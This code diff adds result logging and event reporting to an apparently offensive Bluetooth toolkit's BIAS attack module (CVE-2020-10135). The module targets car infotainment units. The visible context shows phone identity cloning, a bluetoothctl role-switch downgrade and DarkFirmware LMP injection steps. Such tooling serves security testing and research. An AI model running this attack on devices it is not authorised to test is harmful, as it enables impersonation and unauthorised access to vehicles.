@@ -45,6 +45,11 @@ from blue_tap.utils.output import (
     info, success, error, warning, verbose,
     phase, step, substep, summary_panel, target,
 )
+from blue_tap.core.result_schema import (
+    EXECUTION_COMPLETED, EXECUTION_FAILED, EXECUTION_ERROR,
+    build_run_envelope, make_execution, make_evidence, make_run_id, now_iso,
+)
+from blue_tap.core.cli_events import emit_cli_event
 
 
 class BIASAttack:
@@ -61,6 +66,18 @@ class BIASAttack:
         self.phone_address = phone_address
         self.phone_name = phone_name
         self.hci = hci
+        self.run_id = make_run_id("bias")
+        self._started_at = now_iso()
+        self._cli_events: list[dict] = []
+        self._executions: list[dict] = []
+
+    def _emit(self, event_type: str, message: str, **details):
+        evt = emit_cli_event(
+            event_type=event_type, module="attack", run_id=self.run_id,
+            target=self.ivi_address, adapter=self.hci, message=message,
+            details=details,
+        )
+        self._cli_events.append(evt)
 
     def probe_vulnerability(self) -> dict:
         """Probe whether the IVI may be vulnerable to BIAS.
@@ -73,8 +90,19 @@ class BIASAttack:
 
         Returns dict with vulnerability assessment.
         """
+        phase_start = now_iso()
+        self._emit("phase_started", "BIAS vulnerability probe starting")
         from blue_tap.utils.bt_helpers import ensure_adapter_ready
         if not ensure_adapter_ready(self.hci):
+            self._executions.append(make_execution(
+                kind="check", id="bias_probe", title="BIAS Vulnerability Probe (CVE-2020-10135)",
+                module="attack", protocol="BR/EDR",
+                execution_status=EXECUTION_ERROR, module_outcome="failed",
+                evidence=make_evidence(summary="Adapter not ready", confidence="high"),
+                started_at=phase_start, completed_at=now_iso(),
+                tags=["cve", "CVE-2020-10135", "bias"],
+            ))
+            self._emit("run_error", "BIAS probe failed: adapter not ready")
             return {"potentially_vulnerable": False, "error": "adapter not ready"}
 
         result = {
@@ -163,6 +191,23 @@ class BIASAttack:
             for note in result["notes"]:
                 substep(f"Note: {note}")
 
+        self._executions.append(make_execution(
+            kind="check", id="bias_probe", title="BIAS Vulnerability Probe (CVE-2020-10135)",
+            module="attack", protocol="BR/EDR",
+            execution_status=EXECUTION_COMPLETED,
+            module_outcome="confirmed" if result["potentially_vulnerable"] else "not_applicable",
+            evidence=make_evidence(
+                summary=f"SSP={result['ssp_detected']}, BT={result.get('bt_version', '?')}, auto_reconnect={result['auto_reconnects']}",
+                confidence="medium",
+                observations=result["notes"],
+                module_evidence={"ssp": result["ssp_detected"], "bt_version": result.get("bt_version"), "auto_reconnects": result["auto_reconnects"]},
+            ),
+            started_at=phase_start, completed_at=now_iso(),
+            tags=["cve", "CVE-2020-10135", "bias"],
+            module_data=result,
+        ))
+        self._emit("execution_result", f"BIAS probe: {'potentially vulnerable' if result['potentially_vulnerable'] else 'not vulnerable'}")
+
         return result
 
     def execute_role_switch(self) -> dict:
@@ -187,6 +232,8 @@ class BIASAttack:
           - IVI validates link key (we don't have it)
           - IVI has BIAS patches applied
         """
+        phase_start = now_iso()
+        self._emit("phase_started", "BIAS role-switch attack starting")
         results = {
             "method": "role_switch_downgrade",
             "connected": False,
@@ -197,12 +244,22 @@ class BIASAttack:
         with phase("BIAS Role-Switch Attack"):
             # Step 1: Clone phone identity
             with step(f"Cloning {target(self.phone_address)} identity"):
-                if not clone_device_identity(
+                clone_result = clone_device_identity(
                     self.hci, self.phone_address,
                     self.phone_name or "Phone", "0x5a020c",
-                ):
+                )
+                if not clone_result.get("success", False):
                     error("Identity clone failed")
                     results["notes"].append("Failed to spoof MAC/name")
+                    self._executions.append(make_execution(
+                        kind="check", id="bias_role_switch", title="BIAS Role-Switch Attack",
+                        module="attack", protocol="BR/EDR",
+                        execution_status=EXECUTION_FAILED, module_outcome="failed",
+                        evidence=make_evidence(summary="Identity clone failed", confidence="high", observations=results["notes"]),
+                        started_at=phase_start, completed_at=now_iso(),
+                        tags=["cve", "CVE-2020-10135", "bias", "role-switch"], module_data=results,
+                    ))
+                    self._emit("run_error", "BIAS role-switch failed: identity clone failed")
                     return results
                 success("Identity cloned")
                 time.sleep(2)
@@ -242,6 +299,15 @@ class BIASAttack:
                     error("bluetoothctl timed out after 30s — BIAS connection may be incomplete")
                     run_cmd(["bluetoothctl", "cancel-pairing", self.ivi_address], timeout=5)
                     results["notes"].append("bluetoothctl timed out")
+                    self._executions.append(make_execution(
+                        kind="check", id="bias_role_switch", title="BIAS Role-Switch Attack",
+                        module="attack", protocol="BR/EDR",
+                        execution_status=EXECUTION_FAILED, module_outcome="failed",
+                        evidence=make_evidence(summary="bluetoothctl timed out", confidence="high", observations=results["notes"]),
+                        started_at=phase_start, completed_at=now_iso(),
+                        tags=["cve", "CVE-2020-10135", "bias", "role-switch"], module_data=results,
+                    ))
+                    self._emit("run_error", "BIAS role-switch failed: bluetoothctl timeout")
                     return results
                 output = proc_result.stdout + proc_result.stderr
                 verbose(f"bluetoothctl output:\n{output.strip()}")
@@ -282,6 +348,25 @@ class BIASAttack:
             for note in results["notes"]:
                 substep(note)
 
+        self._executions.append(make_execution(
+            kind="check", id="bias_role_switch", title="BIAS Role-Switch Attack",
+            module="attack", protocol="BR/EDR",
+            execution_status=EXECUTION_COMPLETED,
+            module_outcome="success" if results["connected"] else "failed",
+            destructive=False,
+            requires_pairing=False,
+            evidence=make_evidence(
+                summary=f"Role-switch downgrade: connected={results['connected']}, auth={results['auth_method']}",
+                confidence="medium",
+                observations=results["notes"],
+                module_evidence={"connected": results["connected"], "auth_method": results["auth_method"]},
+            ),
+            started_at=phase_start, completed_at=now_iso(),
+            tags=["cve", "CVE-2020-10135", "bias", "role-switch"],
+            module_data=results,
+        ))
+        self._emit("execution_result", f"BIAS role-switch: {'connected' if results['connected'] else 'not connected'}")
+
         return results
 
     def execute_darkfirmware(self, variant: str = "auto") -> dict:
@@ -306,6 +391,8 @@ class BIASAttack:
             variant: "auto" (tries role_switch first), "role_switch",
                      "legacy_downgrade", or "unilateral_auth".
         """
+        phase_start = now_iso()
+        self._emit("phase_started", "BIAS DarkFirmware LMP attack starting")
         result = {
             "method": "darkfirmware",
             "variant": variant,
@@ -330,6 +417,15 @@ class BIASAttack:
             hci_idx = int(self.hci.replace("hci", "")) if self.hci.startswith("hci") else 1
             if not fw.is_darkfirmware_loaded(self.hci):
                 result["details"].append("DarkFirmware not loaded on adapter")
+                self._executions.append(make_execution(
+                    kind="check", id="bias_darkfirmware", title="BIAS DarkFirmware LMP Attack",
+                    module="attack", protocol="BR/EDR",
+                    execution_status=EXECUTION_FAILED, module_outcome="not_applicable",
+                    evidence=make_evidence(summary="DarkFirmware not loaded on adapter", confidence="high", observations=result["details"]),
+                    started_at=phase_start, completed_at=now_iso(),
+                    tags=["cve", "CVE-2020-10135", "bias", "darkfirmware"], module_data=result,
+                ))
+                self._emit("run_error", "BIAS DarkFirmware: not loaded on adapter")
                 return result
 
             info("[BIAS] Step 1: DarkFirmware confirmed on adapter")
@@ -337,10 +433,20 @@ class BIASAttack:
 
             # Phase 1: Clone phone identity
             info(f"[BIAS] Step 2: Cloning identity {self.phone_address}")
-            if not clone_device_identity(self.hci, self.phone_address,
-                                          self.phone_name, "0x5a020c"):
+            clone_result = clone_device_identity(self.hci, self.phone_address,
+                                                   self.phone_name, "0x5a020c")
+            if not clone_result.get("success", False):
                 error("[BIAS] Identity cloning failed")
                 result["details"].append("Identity cloning failed")
+                self._executions.append(make_execution(
+                    kind="check", id="bias_darkfirmware", title="BIAS DarkFirmware LMP Attack",
+                    module="attack", protocol="BR/EDR",
+                    execution_status=EXECUTION_FAILED, module_outcome="failed",
+                    evidence=make_evidence(summary="Identity cloning failed", confidence="high", observations=result["details"]),
+                    started_at=phase_start, completed_at=now_iso(),
+                    tags=["cve", "CVE-2020-10135", "bias", "darkfirmware"], module_data=result,
+                ))
+                self._emit("run_error", "BIAS DarkFirmware: identity clone failed")
                 return result
             result["details"].append(f"Cloned identity: {self.phone_address}")
 
@@ -465,7 +571,48 @@ class BIASAttack:
             error(f"[BIAS] DarkFirmware attack error: {exc}")
             result["details"].append(f"DarkFirmware attack error: {exc}")
 
+        self._executions.append(make_execution(
+            kind="check", id="bias_darkfirmware", title="BIAS DarkFirmware LMP Attack",
+            module="attack", protocol="BR/EDR",
+            execution_status=EXECUTION_COMPLETED if result["success"] else EXECUTION_FAILED,
+            module_outcome="success" if result["success"] else "failed",
+            evidence=make_evidence(
+                summary=f"DarkFirmware variant={result['variant']}, success={result['success']}, au_rand={result['au_rand_received']}",
+                confidence="medium",
+                observations=result["details"],
+                module_evidence={"variant": result["variant"], "au_rand_received": result["au_rand_received"], "lmp_events": result.get("lmp_events", 0)},
+            ),
+            started_at=phase_start, completed_at=now_iso(),
+            tags=["cve", "CVE-2020-10135", "bias", "darkfirmware"],
+            module_data=result,
+        ))
+        self._emit("execution_result", f"BIAS DarkFirmware: {'succeeded' if result['success'] else 'failed'} (variant={result['variant']})")
+
         return result
+
+    def build_envelope(self) -> dict:
+        """Build a RunEnvelope v2 dict summarising all executions so far."""
+        return build_run_envelope(
+            schema="blue_tap.attack.result",
+            module="attack",
+            target=self.ivi_address,
+            adapter=self.hci,
+            operator_context={
+                "command": "bias",
+                "cve": "CVE-2020-10135",
+                "ivi_address": self.ivi_address,
+                "phone_address": self.phone_address,
+            },
+            summary={
+                "operation": "bias",
+                "cve": "CVE-2020-10135",
+                "connected": any(e.get("module_outcome") == "success" for e in self._executions),
+            },
+            executions=self._executions,
+            module_data={"cli_events": self._cli_events},
+            started_at=self._started_at,
+            run_id=self.run_id,
+        )
 
     def execute(self, method: str = "auto") -> dict:
         """Run BIAS attack with the best available method.
@@ -476,14 +623,21 @@ class BIASAttack:
           darkfirmware: Full BIAS via DarkFirmware LMP injection on RTL8761B
           probe: Only probe vulnerability, don't attack
 
-        Returns dict with attack results.
+        Returns dict with attack results and attached envelope.
         """
+        self._emit("run_started", f"BIAS attack started (method={method})", method=method)
+
         if method == "probe":
-            return self.probe_vulnerability()
+            results = self.probe_vulnerability()
+            results["envelope"] = self.build_envelope()
+            self._emit("run_completed", "BIAS run completed (probe only)")
+            return results
 
         if method in ("auto", "role_switch"):
             results = self.execute_role_switch()
             if results["connected"]:
+                results["envelope"] = self.build_envelope()
+                self._emit("run_completed", "BIAS run completed (role-switch succeeded)")
                 return results
 
             if method == "auto":
@@ -493,12 +647,20 @@ class BIASAttack:
                 # Merge notes
                 df_results.setdefault("notes", [])
                 df_results["notes"] = results["notes"] + df_results["notes"]
+                df_results["envelope"] = self.build_envelope()
+                self._emit("run_completed", "BIAS run completed (auto: darkfirmware attempted)")
                 return df_results
 
+            results["envelope"] = self.build_envelope()
+            self._emit("run_completed", "BIAS run completed (role-switch only)")
             return results
 
         if method == "darkfirmware":
-            return self.execute_darkfirmware()
+            results = self.execute_darkfirmware()
+            results["envelope"] = self.build_envelope()
+            self._emit("run_completed", "BIAS run completed (darkfirmware)")
+            return results
 
         error(f"Unknown BIAS method: {method}")
+        self._emit("run_completed", f"BIAS run aborted: unknown method {method}")
         return {"connected": False, "error": f"Unknown method: {method}"}
